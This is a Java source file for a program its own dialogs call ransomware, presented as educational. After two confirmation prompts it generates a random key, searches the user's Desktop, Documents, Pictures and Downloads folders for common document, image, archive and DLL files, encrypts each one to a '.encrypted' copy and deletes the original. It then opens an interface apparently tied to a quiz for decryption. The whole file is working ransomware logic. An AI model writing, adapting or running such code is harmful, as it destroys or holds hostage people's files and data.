import org.apache.commons.io.FileUtils;
import java.io.*;
import java.security.SecureRandom;
import java.util.*;
import javax.swing.*;

public class Main {
    static JFrame f;
    static JLabel l;

    public enum OS {
        WINDOWS, LINUX, MAC, SOLARIS
    };
    public static String key = null;

    private static OS os = null;

    public static void main(String[] args) {
        if (ConfirmationPrompt()) {
            generateKey();
            FileFinder(false);
            Interface();
        }
    }

    // Prompt to ensure user knows program is considered malware
    public static boolean ConfirmationPrompt() {
        int result = JOptionPane.showConfirmDialog(null, "This program is for educational purposes only. It is made purely for the sake of reverse engineering. Only run this program on a Virtual Machine, and if you choose to run it, you will be held accountable for any damages caused.", "Ransomware Confirmation", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);

        if (result == JOptionPane.YES_OPTION) {
            int result2 = JOptionPane.showConfirmDialog(null, "ARE YOU SURE YOU WANT TO RUN THIS HARMFUL PROGRAM? YOU CAN LOSE ALL IMPORTANT DATA PERMANENTLY", "Ransomware Confirmation", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
            if (result2 == JOptionPane.YES_OPTION) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    // Generates random 16 byte key
    public static void generateKey() {
        SecureRandom secureRandom = new SecureRandom();
        key = Base64.getEncoder().encodeToString(secureRandom.generateSeed(16));
    }

    // Finds directory list of all file extensions mentioned and sends to encryptor/decryptor method based on state
    public static void FileFinder(boolean state) {
        ArrayList<String> CriticalPathList = new ArrayList<String>();

        switch (getOS()) {
            case WINDOWS:

            case LINUX:

            case MAC:

            case SOLARIS:
        }

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");
        CriticalPathList.add(System.getProperty("user.home") + "/Downloads");

        for (String TargetDirectory:CriticalPathList) {
            File root = new File(TargetDirectory);

            try {
                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jfif", "doc", "rtf", "wpd", "html", "xlsx", "csv", "dll"};
                String[] decrypted = {"encrypted"};

                Collection files;

                if (!state) {
                    files = FileUtils.listFiles(root, extensions, true);
                } else {
                    files = FileUtils.listFiles(root, decrypted, true);
                }

                for (Object o : files) {
                    File file = (File) o;
                    if (!state)
                        Encryptor(file.getAbsolutePath());
                    else
                        Decryptor(file.getAbsolutePath());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // Encrypts all files provided using the randomly generated key
    public static void Encryptor(String TargetFilePath) {
        File targetFile = new File(TargetFilePath);
        File encryptedTargetFile = new File(TargetFilePath + ".encrypted");

        try {
            CryptoUtils.encrypt(key, targetFile, encryptedTargetFile);
        } catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();
    }

    // Opens user interface for navigating to the quiz
    public static void Interface() {
        InterfaceForm newForm = new InterfaceForm();
        newForm.isVisible();
    }

    // Decrypts all files provided using the randomly generated key
    public static void Decryptor(String EncryptedFilePath) {
        File targetFile = new File(EncryptedFilePath);
        String extension1 = EncryptedFilePath.substring(0, (EncryptedFilePath.length() - 10));
        String fileType = extension1.substring(extension1.lastIndexOf('.'));
        String fileName = extension1.substring(0, (extension1.lastIndexOf('.')));
        File decryptedTargetFile = new File(fileName + fileType);

        try {
            CryptoUtils.decrypt(key,targetFile,decryptedTargetFile);
        } catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();
    }

    // Determines which operating system is in use
    public static OS getOS() {
        if (os == null) {
            String operSys = System.getProperty("os.name").toLowerCase();

            if (operSys.contains("win")) {
                os = OS.WINDOWS;
            } else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                os = OS.LINUX;
            } else if (operSys.contains("mac")) {
                os = OS.MAC;
            } else if (operSys.contains("sunos")) {
                os = OS.SOLARIS;
            }
        }
        return os;
    }
}